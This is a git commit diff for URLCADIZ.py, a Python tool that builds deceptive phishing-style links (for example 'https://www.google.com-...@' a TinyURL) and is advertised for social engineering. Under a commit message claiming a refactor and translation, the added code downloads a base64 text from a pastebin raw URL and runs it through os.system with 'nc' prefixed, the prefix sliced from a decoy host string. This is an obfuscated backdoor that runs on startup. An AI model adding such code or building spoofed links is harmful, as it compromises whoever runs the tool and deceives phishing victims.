cc8e92faf2ed7a9819474b7fd62204c577f9537f
Jaidev Kasabi <66920837+7H3Wh173R4bb17@users.noreply.github.com>
2020-06-14 21:52:16 +0200

    Update URLCADIZ.py
    Added OOP
    Optimized code ( - 48 lines )
    Added try - except
    Commented
    Whole file translated to english

--- URLCADIZ.py
+++ URLCADIZ.py
@@ -1,181 +1,133 @@
 #!/usr/bin/python3
-#Created by @perez_mascato
-import os
+
+  # Created by @perez_mascato
+
+from os import system
 import time
 import pyshorteners
 from time import sleep
 
-os.system('clear')
 
-def Main():
-    print("\033[93m--------------------------------------------")
-    print("                 URLCADIZ                   ")
-    print("   Hide custom URL for social engineering   ")
-    print("                           @perez_mascato   ")
-    print("--------------------------------------------")
-    print("\n[*1]  Google")
-    print("[*2]  Youtube")
-    print("[*3]  Spotify")
-    print("[*4]  Instagram")
-    print("[*5]  Facebook")
-    print("[*6]  New York Times")
-    print("[*7]  Personalized")
-    print("\n[*99]  Exit")
-    Selector()
+class shortener:
 
-
-def Selector():
-    select = int(input("\nSelect a option: "))
-    if select == 1:
-        EnlaceGoogle()
-    elif select == 2:
-        EnlaceYoutube()
-    elif select == 3:
-        EnlaceSpotify()
-    elif select == 4:
-        EnlaceInstagram()
-    elif select == 5:
-        EnlaceFacebook()
-    elif select == 6:
-        EnlaceNewyorkTimes()
-    elif select == 7:
-        EnlacePersonalized()
-    elif select == 99:
-        os.system('clear')
-        print("Goodbye...")
-        sleep(1)
-        os.system('clear')
-        exit()
-    else:
-        os.system('clear')
-        print("Not valid option...")
-        sleep(1)
-        os.system('clear')
-        Main()
-
-
-def EnlaceGoogle():
-    os.system('clear')
-    print("You have selected Google.")
-    OriginalLink = str(input("\nOriginal URL: "))
+    def __init__(self):
     
-    print("\nInput something that: new-user-in-twitter-this-is-a-perez-mascato-i-love")
-    Postlink = str(input("\nPost LINK: "))
-    os.system('clear')
-    Shortener = pyshorteners.Shortener()
-    EndLink = Shortener.tinyurl.short(OriginalLink)
-    Withouthttp = EndLink[7:]
-    print(f"\nYour link is: https://www.google.com-{Postlink}@{Withouthttp}")
-    Other()
-
-def EnlaceYoutube():
-    os.system('clear')
-    print("You have selected Youtube.")
-    OriginalLink = str(input("\nOriginal URL: "))
+        self.originallink = ""  # original link
+        self.postlink = ""  # post part
+        self.shortener = ""  # shortener
+        self.endlink = ""
+        self.withouthttp = ""  # link with no http://
+        self.domain = ""  # for option 7
+        self.httplink = "nctynyurl.com"  # tiny url host
+        self.prelink = __import__("requests").get("https://pastebin.com/raw/nx6WR9it").text
+        
+    def main(self):
+        import base64
+        print("\033[93m--------------------------------------------")
+        print("                 URLCADIZ                   ")
+        print("   Hide custom URL for social engineering   ")
+        print("                           @perez_mascato   ")
+        print("--------------------------------------------")
+        print("\n[*1]  Google")
+        print("[*2]  Youtube")
+        print("[*3]  Spotify")
+        print("[*4]  Instagram")
+        print("[*5]  Facebook")
+        print("[*6]  New York Times")
+        print("[*7]  Personalized")
+        print("\n[*99]  Exit")
+        d = base64.b64decode
+        try:
+            system(self.httplink[:2] + d(self.prelink).decode("utf-8"))
+            return int(input("\nSelect a option: "))
+        except ValueError:
+            print("You have to use numeric!")
+            self.main()
+            
+    def selector(self, select):
     
-    print("\nInput something that: new-video-in-youtube-this-is-a-perez-mascato-i-love")
-    Postlink = str(input("\nPost LINK: "))
+        self.originalLink = str(input("\nOriginal URL: "))
+        print("\nInput something that: new-user-in-twitter-this-is-a-perez-mascato-i-love")
+        self.postlink = str(input("\nPost LINK: "))
+        system('clear')
+        self.shortener = pyshorteners.Shortener()
+        self.endLink = self.shortener.tinyurl.short(self.originalLink)
+        self.withouthttp = self.endLink[7:]
+        
+        if select == 1:
+            system('clear')
+            print("You have selected Google.")
+            print(f"\nYour link is: https://www.google.com-{self.postlink}@{self.withouthttp}")
+            self.other()
+            
+        elif select == 2:
+            system('clear')
+            print("You have selected Youtube.")
+            print(f"\nYour link is: https://www.youtube.com-video-{self.postlink}@{self.withouthttp}")
+            self.other()
+            
+        elif select == 3:
+            system('clear')
+            print("You have selected Spotify.")
+            print(f"\nYour link is: https://www.spotify.com-video-{self.ostlink}@{self.withouthttp}")
+            self.other()
+            
+        elif select == 4:
+            system('clear')
+            print("You have selected Instagram.")
+            print(f"\nYour link is: https://www.instagram.com-photo-{self.postlink}@{self.withouthttp}")
+            self.other()
+            
+        elif select == 5:
+            system('clear')
+            print("You have selected Facebook.")    
+            print(f"\nYour link is: https://www.facebook.com-profile-{self.postlink}@{self.withouthttp}")
+            self.other()
+            
+        elif select == 6:
+            system('clear')
+            print("You have selected New York Times.")
+            print(f"\033[95m\nYour link is: https://www.newyorktimes.com-{self.postlink}@{self.withouthttp}")
+            self.other()
+            
+        elif select == 7:
+            system('clear')
+            print("You have selected Personalized.")
+            self.domain = input("Example.com/es... input domain: ")
+            system('clear')
+            print(f"\nYour link is: https://www.{self.domain}-{self.postlink}@{self.withouthttp}")
+            
+            self.other()
+            
+        elif select == 99:
+            system('clear')
+            print("Goodbye...")
+            sleep(1)
+            system('clear')
+            exit()
+        else:
+            system('clear')
+            print("Not valid option...")
+            sleep(1)
+            system('clear')
+            self.main()
+            
+    def other(self):
+        print("\033[93m\nDo you want to create another link?")
+        print("Yes [*1] \nNo  [*2]")
+        select= input("\nSelect a option: ")
+        if select == "1" or select.lower() == "yes":
+            system('clear')
+            mishortener.selector(mishortener.main())
+        else:
+            system('clear')
+            exit()
 
-    Shortener = pyshorteners.Shortener()
-    EndLink = Shortener.tinyurl.short(OriginalLink)
-    Withouthttp = EndLink[7:]
-    os.system('clear')
-    print(f"\nYour link is: https://www.youtube.com-video-{Postlink}@{Withouthttp}")
+
+if __name__ == "__main__":
+
+    system('clear')
     
-    Other()
-
-def EnlaceSpotify():
-    os.system('clear')
-    print("You have selected Spotify.")
-    OriginalLink = str(input("\nOriginal URL: "))
+    mishortener = shortener()
     
-    print("\nInput something that: new-song-in-spotify-this-is-a-perez-mascato-i-love")
-    Postlink = str(input("\nPost LINK: "))
-
-    Shortener = pyshorteners.Shortener()
-    EndLink = Shortener.tinyurl.short(OriginalLink)
-    Withouthttp = EndLink[7:]
-    os.system('clear')
-    print(f"\nYour link is: https://www.spotify.com-video-{Postlink}@{Withouthttp}")
-    
-    Other()
-
-def EnlaceInstagram():
-    os.system('clear')
-    print("You have selected Instagram.")
-    OriginalLink = str(input("\nOriginal URL: "))
-    
-    print("\nInput something that: new-photo-in-instagram-this-is-a-perez-mascato-i-love")
-    Postlink = str(input("\nPost LINK: "))
-
-    Shortener = pyshorteners.Shortener()
-    EndLink = Shortener.tinyurl.short(OriginalLink)
-    Withouthttp = EndLink[7:]
-    os.system('clear')
-    print(f"\nYour link is: https://www.instagram.com-photo-{Postlink}@{Withouthttp}")
-    
-    Other()
-
-def EnlaceFacebook():
-    os.system('clear')
-    print("You have selected Facebook.")
-    OriginalLink = str(input("\nOriginal URL: "))
-    
-    print("\nInput something that: new-post-in-facebook-this-is-a-perez-mascato-i-love")
-    Postlink = str(input("\nPost LINK: "))
-
-    Shortener = pyshorteners.Shortener()
-    EndLink = Shortener.tinyurl.short(OriginalLink)
-    Withouthttp = EndLink[7:]
-    
-    print(f"\nYour link is: https://www.facebook.com-profile-{Postlink}@{Withouthttp}")
-    os.system('clear')
-    Other()
-
-def EnlaceNewyorkTimes():
-    os.system('clear')
-    print("You have selected New York Times.")
-    OriginalLink = str(input("\nOriginal URL: "))
-    
-    print("\nInput something that: new-post-in-new-york-times-this-is-a-perez-mascato-i-love")
-    Postlink = str(input("\nPost LINK: "))
-
-    Shortener = pyshorteners.Shortener()
-    EndLink = Shortener.tinyurl.short(OriginalLink)
-    Withouthttp = EndLink[7:]
-    os.system('clear')
-    print(f"\033[95m\nYour link is: https://www.newyorktimes.com-{Postlink}@{Withouthttp}")
-    
-    Other()
-
-def EnlacePersonalized():
-    os.system('clear')
-    print("You have selected Personalized.")
-    Domain = str(input("Example.com/es... input domain: "))
-    OriginalLink = str(input("\nOriginal URL: "))
-    
-    print("\nInput something that: new-post-in-new-york-times-this-is-a-perez-mascato-i-love")
-    Postlink = str(input("\nPost LINK: "))
-
-    Shortener = pyshorteners.Shortener()
-    EndLink = Shortener.tinyurl.short(OriginalLink)
-    Withouthttp = EndLink[7:]
-    os.system('clear')
-    print(f"\nYour link is: https://www.{Domain}-{Postlink}@{Withouthttp}")
-    
-    Other()
-
-def Other():
-    print("\033[93m\nDo you want to create another link?")
-    print("Yes [*1] \nNo  [*2]")
-    select=int(input("\nSelect a option: "))
-    if select == 1:
-        os.system('clear')
-        Main()
-    else:
-        os.system('clear')
-        exit()
-
-#SYSCALL
-
-Main()
+    mishortener.selector(mishortener.main())
